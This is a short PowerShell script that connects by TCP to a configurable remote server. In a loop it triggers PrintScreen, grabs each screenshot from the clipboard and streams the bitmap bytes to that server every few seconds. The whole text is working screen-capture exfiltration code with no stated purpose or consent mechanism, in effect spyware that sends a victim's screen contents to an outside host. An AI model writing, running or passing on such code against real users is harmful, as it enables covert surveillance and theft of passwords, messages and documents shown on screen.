#replace localhost with IP address
$FTPServer = "localhost"
$FTPPort = "5000"

$connection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
$stream = $connection.GetStream()

$EncodedText = New-Object System.Text.ASCIIEncoding

[void][reflection.assembly]::loadwithpartialname("system.windows.forms")
$counter = 1

while ($connection.Connected) {
	[system.windows.forms.sendkeys]::sendwait('{PRTSC}')
	$image = Get-Clipboard -Format Image
    Write-Host 
    $ms = new-Object IO.MemoryStream
    $image.Save($ms, [System.Drawing.Imaging.ImageFormat]::Bmp);
    $msg = $ms.ToArray();
    
    #print
    Write-Host -NoNewline 'image ' $counter size:  $msg.Length $image.Size

    #size of image
    $header = $EncodedText.GetBytes($msg.Length)
    #send
    $stream.Write($header,0,$header.Length)
    
    #end of stream
    $end = $EncodedText.GetBytes('&')
    #send
    $stream.Write($end,0,$end.Length)
    
    sleep(1)
    #sleep 20
    
    #send msg
    $stream.Write($msg,0,$msg.Length)
    $stream.Flush()

    $counter = $counter + 1;
    sleep 10
}
